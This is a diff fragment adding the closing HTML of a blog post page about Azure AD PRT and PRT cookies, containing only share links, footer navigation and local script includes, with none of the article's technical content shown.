+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fazuretoken%2f&name=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token&description=1.%20PRT%20%2f%20Session%20key%20%26amp%3b%20PRT%20Cookie%20%3a%20Quick%20recap%20WARNING%20%3a%20This%20is%20only%20an%20attempt%20to%20make%20a%20quick%20summary%20of%20the%20PRT%20%2f%20PRT%20Cookie%20mechanism%20%28in%20order%20for%20me%20to%20understand%20it%20properly%29%20based%20on%20some%20amazing%20blog%20post%20such%20as%20jairocadena%20or%20microsoft%0aWARNING%202%20%3a%20As%20the%20AzureAD%20device%20joining%20process%20is%20not%20the%20purpose%20of%20this%20article%2c%20I%20can%20only%20urge%20you%20to%20read%20some%20amazing%20blog%20post%20about%20it%20such%20as%20this%20one" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fazuretoken%2f&t=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2022   
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/posts/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
